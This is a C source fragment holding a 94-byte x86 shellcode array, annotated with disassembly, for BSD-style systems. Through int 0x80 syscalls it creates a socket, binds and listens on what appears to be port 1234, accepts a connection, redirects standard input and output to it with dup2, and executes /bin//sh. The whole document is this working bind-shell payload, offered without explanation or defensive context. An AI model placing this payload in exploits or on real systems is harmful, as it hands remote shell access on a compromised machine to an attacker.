
#define BS_SIZE 94

char BS[] = {
  /* 0000 */ "\xb8\xff\xff\xff\xff" /* mov eax, 0xffffffff */
  /* 0005 */ "\xba\xff\xfd\xfb\x2d" /* mov edx, 0x2dfbfdff */
  /* 000A */ "\xf7\xd0"             /* not eax             */
  /* 000C */ "\xf7\xd2"             /* not edx             */
  /* 000E */ "\x50"                 /* push eax            */
  /* 000F */ "\x52"                 /* push edx            */
  /* 0010 */ "\x89\xe7"             /* mov edi, esp        */
  /* 0012 */ "\x6a\x61"             /* push 0x61           */
  /* 0014 */ "\x58"                 /* pop eax             */
  /* 0015 */ "\x99"                 /* cdq                 */
  /* 0016 */ "\x52"                 /* push edx            */
  /* 0017 */ "\x6a\x01"             /* push 0x1            */
  /* 0019 */ "\x6a\x02"             /* push 0x2            */
  /* 001B */ "\x6a\x10"             /* push 0x10           */
  /* 001D */ "\xcd\x80"             /* int 0x80            */
  /* 001F */ "\x93"                 /* xchg ebx, eax       */
  /* 0020 */ "\x57"                 /* push edi            */
  /* 0021 */ "\x53"                 /* push ebx            */
  /* 0022 */ "\x52"                 /* push edx            */
  /* 0023 */ "\x6a\x68"             /* push 0x68           */
  /* 0025 */ "\x58"                 /* pop eax             */
  /* 0026 */ "\xcd\x80"             /* int 0x80            */
  /* 0028 */ "\x53"                 /* push ebx            */
  /* 0029 */ "\x52"                 /* push edx            */
  /* 002A */ "\x6a\x6a"             /* push 0x6a           */
  /* 002C */ "\x58"                 /* pop eax             */
  /* 002D */ "\xcd\x80"             /* int 0x80            */
  /* 002F */ "\x52"                 /* push edx            */
  /* 0030 */ "\x53"                 /* push ebx            */
  /* 0031 */ "\x6a\x02"             /* push 0x2            */
  /* 0033 */ "\x6a\x1e"             /* push 0x1e           */
  /* 0035 */ "\x58"                 /* pop eax             */
  /* 0036 */ "\xcd\x80"             /* int 0x80            */
  /* 0038 */ "\x50"                 /* push eax            */
  /* 0039 */ "\x52"                 /* push edx            */
  /* 003A */ "\x6a\x5a"             /* push 0x5a           */
  /* 003C */ "\x58"                 /* pop eax             */
  /* 003D */ "\xcd\x80"             /* int 0x80            */
  /* 003F */ "\xff\x4c\x24\x08"     /* dec dword [esp+0x8] */
  /* 0043 */ "\x79\xf5"             /* jns 0x3a            */
  /* 0045 */ "\x52"                 /* push edx            */
  /* 0046 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f     */
  /* 004B */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f     */
  /* 0050 */ "\x89\xe3"             /* mov ebx, esp        */
  /* 0052 */ "\x52"                 /* push edx            */
  /* 0053 */ "\x53"                 /* push ebx            */
  /* 0054 */ "\x89\xe1"             /* mov ecx, esp        */
  /* 0056 */ "\x52"                 /* push edx            */
  /* 0057 */ "\x51"                 /* push ecx            */
  /* 0058 */ "\x53"                 /* push ebx            */
  /* 0059 */ "\x52"                 /* push edx            */
  /* 005A */ "\xb0\x3b"             /* mov al, 0x3b        */
  /* 005C */ "\xcd\x80"             /* int 0x80            */
};